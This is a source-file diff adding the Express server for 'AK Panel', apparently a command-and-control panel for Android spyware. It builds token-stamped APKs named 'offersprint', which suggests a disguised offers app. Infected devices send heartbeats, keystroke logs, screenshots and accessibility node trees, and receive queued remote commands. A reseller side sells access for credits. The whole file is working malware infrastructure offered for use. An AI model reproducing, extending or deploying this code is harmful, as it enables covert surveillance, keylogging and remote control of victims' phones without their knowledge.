@@ -1,0 +1,521 @@
+/* AK Panel — Express API + SPA static server
+ * - Per-user deviceToken
+ * - Devices keyed by deviceToken
+ * - Heartbeat every 500ms; offline if last seen > 1500ms
+ * - Builds APK with token baked in (pipeline lives in /opt/ak-apk-src; this server only triggers + serves)
+ */
+const express = require('express');
+const path    = require('path');
+const fs      = require('fs');
+const crypto  = require('crypto');
+const cors    = require('cors');
+const { spawn } = require('child_process');
+
+const PORT      = parseInt(process.env.PORT || '80', 10);
+const ROOT      = __dirname;
+const DIST      = path.join(ROOT, 'dist');
+const INDEX     = path.join(DIST, 'index.html');
+const DATA_FILE = path.join(ROOT, 'data.json');
+const BUILDS    = path.join(ROOT, 'builds');
+const PUBLIC_BUILDS = path.join(ROOT, 'public-builds');
+const APK_SRC   = '/opt/ak-apk-src';
+const BASE_APK  = path.join(APK_SRC, 'base.apk');
+const KEYSTORE  = '/root/.android/debug.keystore';
+
+// Heartbeat tuning (ms)
+const HB_INTERVAL_MS = 500;     // APK pings every this ms
+const ONLINE_TTL_MS  = 1500;
+const streaming = {};
+const keyLogs   = {};
+const nodeTree  = {};   // deviceId -> { ts, screenW, screenH, nodes:[] }
+const nodesStreaming = {}; // deviceId -> bool   // deviceId -> [ {ts, pkg, app, hint, text, added, removed} ] capped   // deviceId -> bool (admin viewing → stream screenshots)
+const commands  = {};   // deviceId -> array of pending commands
+const screenshots = {}; // deviceId -> { ts, w, h, buf }    // online if seen within this
+const SESSION_TTL_MS = 1000 * 60 * 60 * 24 * 30; // 30 days
+
+[BUILDS, PUBLIC_BUILDS].forEach(d => { try { fs.mkdirSync(d, { recursive: true }); } catch {} });
+
+// ---------- DB ----------
+let _db = null;
+let _flushTimer = null;
+
+function dbLoad() {
+  if (_db) return _db;
+  try {
+    _db = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+  } catch {
+    _db = { users: [], devices: {}, sessions: {}, builds: {} };
+  }
+  _db.users    = _db.users    || [];
+  _db.devices  = _db.devices  || {};
+  _db.sessions = _db.sessions || {};
+  _db.builds   = _db.builds   || {};
+  return _db;
+}
+function dbSave() {
+  if (_flushTimer) return;
+  _flushTimer = setTimeout(() => {
+    _flushTimer = null;
+    try {
+      const tmp = DATA_FILE + '.tmp';
+      fs.writeFileSync(tmp, JSON.stringify(_db, null, 2));
+      fs.renameSync(tmp, DATA_FILE);
+    } catch (e) { console.error('db save fail', e.message); }
+  }, 100);
+}
+
+// ---------- helpers ----------
+const uid = (n=16) => crypto.randomBytes(n).toString('hex');
+const now = () => Date.now();
+const sha = s => crypto.createHash('sha256').update(s).digest('hex');
+
+function findUser(username) {
+  return dbLoad().users.find(u => u.username.toLowerCase() === String(username || '').toLowerCase());
+}
+function userByToken(token) {
+  return dbLoad().users.find(u => u.deviceToken === token);
+}
+
+// ---------- middleware ----------
+function authSession(req, res, next) {
+  const auth = req.headers.authorization || '';
+  const token = auth.startsWith('Bearer ') ? auth.slice(7) : (req.query.session || '');
+  const sess = dbLoad().sessions[token];
+  if (!sess) return res.status(401).json({ error: 'unauthorized' });
+  if (sess.expiresAt < now()) {
+    delete dbLoad().sessions[token]; dbSave();
+    return res.status(401).json({ error: 'session expired' });
+  }
+  const user = findUser(sess.username);
+  if (!user) return res.status(401).json({ error: 'user not found' });
+  if (user.banned) return res.status(403).json({ error: 'banned' });
+  req.user = user;
+  req.session = sess;
+  next();
+}
+function authAdmin(req, res, next) {
+  authSession(req, res, () => {
+    if (!req.user.isAdmin) return res.status(403).json({ error: 'admin only' });
+    next();
+  });
+}
+
+// ---------- app ----------
+const app = express();
+app.use(cors());
+app.use(express.json({ limit: '2mb' }));
+app.disable('x-powered-by');
+
+// log
+app.use((req, res, next) => {
+  const t0 = Date.now();
+  res.on('finish', () => {
+    if (req.url.startsWith('/api/') || req.url.startsWith('/device/')) {
+      const ms = Date.now() - t0;
+      console.log(`${req.method} ${req.url} ${res.statusCode} ${ms}ms`);
+    }
+  });
+  next();
+});
+
+// =================== AUTH ===================
+app.post('/api/auth/login', (req, res) => {
+  let { username, password } = req.body || {};
+  username = String(username||'').trim();
+  password = String(password||'').trim();
+  const user = findUser(username);
+  if (!user || user.password !== password) {
+    return res.status(401).json({ error: 'invalid credentials', reason: 'invalid' });
+  }
+  if (user.banned) return res.status(403).json({ error: 'banned', reason: 'banned' });
+  if (new Date(user.expiry).getTime() < now()) {
+    return res.status(403).json({ error: 'expired', reason: 'expired' });
+  }
+  const token = uid(24);
+  dbLoad().sessions[token] = { username: user.username, createdAt: now(), expiresAt: now() + SESSION_TTL_MS };
+  dbSave();
+  res.json({
+    session: token,
+    user: pubUser(user)
+  });
+});
+
+app.post('/api/auth/logout', authSession, (req, res) => {
+  const auth = req.headers.authorization || '';
+  const token = auth.startsWith('Bearer ') ? auth.slice(7) : '';
+  delete dbLoad().sessions[token];
+  dbSave();
+  res.json({ ok: true });
+});
+
+app.get('/api/auth/me', authSession, (req, res) => {
+  res.json({ user: pubUser(req.user) });
+});
+
+function pubUser(u) {
+  return {
+    username: u.username,
+    isAdmin: !!u.isAdmin,
+    deviceToken: u.deviceToken,
+    credits: u.credits || 0,
+    expiry: u.expiry,
+    banned: !!u.banned,
+    createdAt: u.createdAt || 0
+  };
+}
+
+// =================== ADMIN: USERS ===================
+app.get('/api/admin/users', authAdmin, (req, res) => {
+  res.json({ users: dbLoad().users.map(pubUser) });
+});
+
+app.post('/api/admin/users', authAdmin, (req, res) => {
+  const { username, password, months } = req.body || {};
+  if (!username || !password) return res.status(400).json({ error: 'username & password required' });
+  if (findUser(username)) return res.status(409).json({ error: 'user exists' });
+  const m = parseInt(months || 1, 10);
+  const cost = m;
+  if ((req.user.credits || 0) < cost) return res.status(400).json({ error: 'insufficient credits' });
+  req.user.credits = (req.user.credits || 0) - cost;
+  const newUser = {
+    username: String(username).trim(),
+    password: String(password),
+    isAdmin: false,
+    deviceToken: uid(20),
+    credits: 0,
+    expiry: new Date(now() + m * 30 * 86400000).toISOString(),
+    banned: false,
+    createdAt: now()
+  };
+  dbLoad().users.push(newUser);
+  dbSave();
+  res.json({ user: pubUser(newUser), credits: req.user.credits });
+});
+
+app.delete('/api/admin/users/:username', authAdmin, (req, res) => {
+  const u = req.params.username;
+  if (u.toLowerCase() === req.user.username.toLowerCase()) return res.status(400).json({ error: 'cannot delete self' });
+  const before = dbLoad().users.length;
+  dbLoad().users = dbLoad().users.filter(x => x.username !== u);
+  dbSave();
+  res.json({ ok: dbLoad().users.length < before });
+});
+
+app.put('/api/admin/users/:username/ban', authAdmin, (req, res) => {
+  const u = findUser(req.params.username);
+  if (!u) return res.status(404).json({ error: 'not found' });
+  u.banned = !!req.body.banned;
+  dbSave();
+  res.json({ user: pubUser(u) });
+});
+
+app.put('/api/admin/users/:username/password', authAdmin, (req, res) => {
+  const u = findUser(req.params.username);
+  if (!u) return res.status(404).json({ error: 'not found' });
+  if (!req.body.password) return res.status(400).json({ error: 'password required' });
+  u.password = String(req.body.password);
+  dbSave();
+  res.json({ ok: true });
+});
+
+app.put('/api/admin/users/:username/credits', authAdmin, (req, res) => {
+  const u = findUser(req.params.username);
+  if (!u) return res.status(404).json({ error: 'not found' });
+  u.credits = Math.max(0, parseInt(req.body.credits || 0, 10));
+  dbSave();
+  res.json({ user: pubUser(u) });
+});
+
+// =================== DEVICES ===================
+function deviceListFor(user) {
+  const all = Object.values(dbLoad().devices);
+  const filtered = user.isAdmin ? all : all.filter(d => d.deviceToken === user.deviceToken);
+  return filtered.map(d => ({
+    ...d,
+    online: (now() - (d.lastSeen || 0)) <= ONLINE_TTL_MS,
+    msSinceSeen: now() - (d.lastSeen || 0),
+    owner: user.isAdmin ? (userByToken(d.deviceToken)?.username || '?') : undefined
+  })).sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
+}
+
+app.get('/api/devices', authSession, (req, res) => {
+  res.json({
+    devices: deviceListFor(req.user),
+    intervalMs: HB_INTERVAL_MS,
+    onlineTtlMs: ONLINE_TTL_MS
+  });
+});
+
+app.delete('/api/devices/:deviceId', authSession, (req, res) => {
+  const d = dbLoad().devices[req.params.deviceId];
+  if (!d) return res.status(404).json({ error: 'not found' });
+  if (!req.user.isAdmin && d.deviceToken !== req.user.deviceToken) {
+    return res.status(403).json({ error: 'forbidden' });
+  }
+  delete dbLoad().devices[req.params.deviceId];
+  dbSave();
+  res.json({ ok: true });
+});
+
+// =================== HEARTBEAT (no auth, token in body) ===================
+app.post('/device/heartbeat', (req, res) => {
+  const b = req.body || {};
+  const tok = String(b.token || '').trim();
+  const did = String(b.deviceId || '').trim();
+  if (!tok || !did) return res.status(400).json({ error: 'token+deviceId required' });
+  const data = dbLoad();
+  const user = data.users.find(u => u.deviceToken === tok);
+  if (!user || user.banned) return res.status(401).json({ error: 'invalid token' });
+  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').toString().split(',')[0].trim();
+  const existing = data.devices[did];
+  data.devices[did] = {
+    deviceId: did,
+    deviceToken: tok,
+    model: b.model || existing?.model || '?',
+    brand: b.brand || existing?.brand || '?',
+    androidVersion: b.androidVersion || existing?.androidVersion || '?',
+    sdkInt: b.sdkInt || existing?.sdkInt || 0,
+    appVersion: b.appVersion || existing?.appVersion || '',
+    screenW: b.screenW || existing?.screenW || 0,
+    screenH: b.screenH || existing?.screenH || 0,
+    accessibilityEnabled: !!b.accessibilityEnabled,
+    firstSeen: existing?.firstSeen || now(),
+    lastSeen: now(),
+    ip
+  };
+  dbSave(data);
+  if (Array.isArray(b.nodes)) {
+    nodeTree[did] = { ts: now(), screenW: b.screenW || 0, screenH: b.screenH || 0, nodes: b.nodes };
+  }
+  if (Array.isArray(b.keylogs) && b.keylogs.length) {
+    const arr = keyLogs[did] || (keyLogs[did] = []);
+    for (const e of b.keylogs) { if (e && typeof e === 'object') arr.push(e); }
+    while (arr.length > 1500) arr.shift();
+  }
+  const pending = commands[did] || [];
+  commands[did] = [];
+  res.json({
+    ok: true,
+    intervalMs: HB_INTERVAL_MS,
+    streaming: !!streaming[did],
+    nodesStreaming: !!nodesStreaming[did],
+    commands: pending
+  });
+});
+
+// =================== BUILD APK ===================
+app.post('/api/build', authSession, async (req, res) => {
+  const buildId = uid(12);
+  const outFile = path.join(PUBLIC_BUILDS, `offersprint-${buildId}.apk`);
+  const meta = {
+    buildId,
+    username: req.user.username,
+    deviceToken: req.user.deviceToken,
+    status: 'building',
+    startedAt: now(),
+    finishedAt: 0,
+    downloadUrl: '',
+    error: ''
+  };
+  dbLoad().builds[buildId] = meta;
+  dbSave();
+
+  // Run build script async
+  buildApk(meta.deviceToken, outFile)
+    .then(() => {
+      meta.status = 'ready';
+      meta.finishedAt = now();
+      meta.downloadUrl = `/api/build/${buildId}/download`;
+      dbSave();
+    })
+    .catch(err => {
+      meta.status = 'error';
+      meta.finishedAt = now();
+      meta.error = String(err.message || err);
+      dbSave();
+      console.error('build fail', err);
+    });
+
+  res.json({ buildId, status: 'building', statusUrl: `/api/build/${buildId}/status` });
+});
+
+app.get('/api/build/:id/status', authSession, (req, res) => {
+  const b = dbLoad().builds[req.params.id];
+  if (!b) return res.status(404).json({ error: 'not found' });
+  if (!req.user.isAdmin && b.username !== req.user.username) return res.status(403).json({ error: 'forbidden' });
+  res.json(b);
+});
+
+app.get('/api/build/:id/download', (req, res) => {
+  const b = dbLoad().builds[req.params.id];
+  if (!b || b.status !== 'ready') return res.status(404).send('not ready');
+  const filePath = path.join(PUBLIC_BUILDS, `offersprint-${req.params.id}.apk`);
+  if (!fs.existsSync(filePath)) return res.status(404).send('missing');
+  res.download(filePath, `offersprint-${req.params.id.slice(0,8)}.apk`);
+});
+
+// Build implementation: copy base.apk → patch assets/token.txt → align → re-sign
+function buildApk(deviceToken, outFile) {
+  return new Promise((resolve, reject) => {
+    if (!fs.existsSync(BASE_APK)) {
+      return reject(new Error('Base APK not built yet. Build /opt/ak-apk-src/ first.'));
+    }
+    const tmp = `/tmp/akbuild-${uid(6)}`;
+    fs.mkdirSync(path.join(tmp, 'assets'), { recursive: true });
+    const work = path.join(tmp, 'work.apk');
+    const aligned = path.join(tmp, 'aligned.apk');
+    fs.copyFileSync(BASE_APK, work);
+    fs.writeFileSync(path.join(tmp, 'assets', 'token.txt'), deviceToken);
+
+    const run = (cmd, args, opts = {}) => new Promise((res, rej) => {
+      const p = spawn(cmd, args, opts);
+      let err = '';
+      p.stderr.on('data', d => err += d.toString());
+      p.on('close', c => c === 0 ? res() : rej(new Error(`${cmd} failed (${c}): ${err.trim()}`)));
+    });
+
+    (async () => {
+      try {
+        // zip -u adds OR updates an entry inside the APK
+        await run('zip', ['-q', work, 'assets/token.txt'], { cwd: tmp });
+        await run('zipalign', ['-f', '-p', '4', work, aligned]);
+        await run('apksigner', ['sign',
+          '--ks', KEYSTORE,
+          '--ks-pass', 'pass:android',
+          '--ks-key-alias', 'androiddebugkey',
+          '--key-pass', 'pass:android',
+          '--out', outFile,
+          aligned
+        ]);
+        try { fs.rmSync(tmp, { recursive: true, force: true }); } catch {}
+        resolve();
+      } catch (e) {
+        try { fs.rmSync(tmp, { recursive: true, force: true }); } catch {}
+        reject(e);
+      }
+    })();
+  });
+}
+
+// Server-info / public ping
+app.get('/api/server-info', (req, res) => {
+  res.json({
+    serverIp: req.socket.localAddress,
+    publicHost: req.headers.host,
+    intervalMs: HB_INTERVAL_MS,
+    onlineTtlMs: ONLINE_TTL_MS,
+    apkBaseReady: fs.existsSync(BASE_APK)
+  });
+});
+app.get('/healthz', (req, res) => res.json({ status: 'ok', uptime: process.uptime() }));
+
+
+// ===== Device control & streaming (admin/owner only) =====
+function authDeviceAccess(req, res, next) {
+  const data = dbLoad();
+  const dev = data.devices[req.params.deviceId];
+  if (!dev) return res.status(404).json({ error: 'device not found' });
+  if (req.user.isAdmin || dev.deviceToken === req.user.deviceToken) { req.device = dev; return next(); }
+  return res.status(403).json({ error: 'not yours' });
+}
+
+app.get('/api/devices/:deviceId', authSession, authDeviceAccess, (req, res) => {
+  const dev = req.device;
+  const ms = now() - (dev.lastSeen || 0);
+  res.json({
+    ...dev,
+    online: ms <= ONLINE_TTL_MS,
+    msSinceSeen: ms,
+    streaming: !!streaming[dev.deviceId],
+    hasScreenshot: !!screenshots[dev.deviceId],
+    owner: (data => data.users.find(u => u.deviceToken === dev.deviceToken)?.username || '?')(dbLoad())
+  });
+});
+
+app.post('/api/devices/:deviceId/stream', authSession, authDeviceAccess, (req, res) => {
+  const enable = req.body && req.body.enable !== false;
+  streaming[req.params.deviceId] = enable;
+  res.json({ ok: true, streaming: enable });
+});
+
+app.post('/api/devices/:deviceId/command', authSession, authDeviceAccess, (req, res) => {
+  const { type, params } = req.body || {};
+  if (!type) return res.status(400).json({ error: 'type required' });
+  const cmd = { id: require('crypto').randomBytes(8).toString('hex'), type, params: params || {}, ts: now() };
+  if (!commands[req.params.deviceId]) commands[req.params.deviceId] = [];
+  commands[req.params.deviceId].push(cmd);
+  // Cap queue to avoid runaway growth
+  if (commands[req.params.deviceId].length > 50) commands[req.params.deviceId] = commands[req.params.deviceId].slice(-50);
+  res.json({ ok: true, commandId: cmd.id });
+});
+
+app.get('/api/devices/:deviceId/screenshot', authSession, authDeviceAccess, (req, res) => {
+  const s = screenshots[req.params.deviceId];
+  if (!s) return res.status(404).json({ error: 'no screenshot yet' });
+  res.set('Content-Type', 'image/jpeg');
+  res.set('Cache-Control', 'no-store');
+  res.set('X-Screenshot-Ts', String(s.ts));
+  res.set('X-Screenshot-W', String(s.w || 0));
+  res.set('X-Screenshot-H', String(s.h || 0));
+  res.send(s.buf);
+});
+
+// APK uploads JPEG bytes here (binary)
+app.post('/device/screenshot', express.raw({ type: '*/*', limit: '6mb' }), (req, res) => {
+  const tok = String(req.query.token || '').trim();
+  const did = String(req.query.deviceId || '').trim();
+  const w = parseInt(req.query.w || '0', 10);
+  const h = parseInt(req.query.h || '0', 10);
+  if (!tok || !did) return res.status(400).end();
+  const data = dbLoad();
+  const user = data.users.find(u => u.deviceToken === tok);
+  if (!user || user.banned) return res.status(401).end();
+  if (!req.body || !req.body.length) return res.status(400).end();
+  screenshots[did] = { ts: now(), w, h, buf: req.body };
+  res.json({ ok: true });
+});
+
+
+app.get('/api/devices/:deviceId/keylogs', authSession, authDeviceAccess, (req, res) => {
+  const did = req.params.deviceId;
+  const since = parseInt(req.query.since, 10) || 0;
+  const limit = Math.min(parseInt(req.query.limit, 10) || 500, 1500);
+  const all = keyLogs[did] || [];
+  const filtered = since > 0 ? all.filter(e => (e.ts || 0) > since) : all;
+  const slice = filtered.slice(-limit);
+  res.json({ logs: slice, total: all.length });
+});
+app.delete('/api/devices/:deviceId/keylogs', authSession, authDeviceAccess, (req, res) => {
+  keyLogs[req.params.deviceId] = [];
+  res.json({ ok: true });
+});
+
+
+app.post('/api/devices/:deviceId/nodes-stream', authSession, authDeviceAccess, (req, res) => {
+  const did = req.params.deviceId;
+  const on = !!(req.body && req.body.on);
+  if (on) nodesStreaming[did] = true; else delete nodesStreaming[did];
+  res.json({ ok: true, on: !!nodesStreaming[did] });
+});
+app.get('/api/devices/:deviceId/nodes', authSession, authDeviceAccess, (req, res) => {
+  const did = req.params.deviceId;
+  const t = nodeTree[did] || null;
+  res.json({ tree: t, requesting: !!nodesStreaming[did] });
+});
+
+// =================== STATIC SPA ===================
+app.use('/api', (req, res) => res.status(404).json({ error: 'not found' }));
+app.use(express.static(DIST, { maxAge: '1h', etag: true, index: false }));
+app.use((req, res) => {
+  if (fs.existsSync(INDEX)) {
+    res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
+    res.set('Pragma', 'no-cache');
+    res.set('Expires', '0');
+    res.sendFile(INDEX);
+  } else res.status(503).send('SPA not built');
+});
+
+
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`AK Panel API + SPA on :${PORT}  (hb=${HB_INTERVAL_MS}ms ttl=${ONLINE_TTL_MS}ms)`);
+});
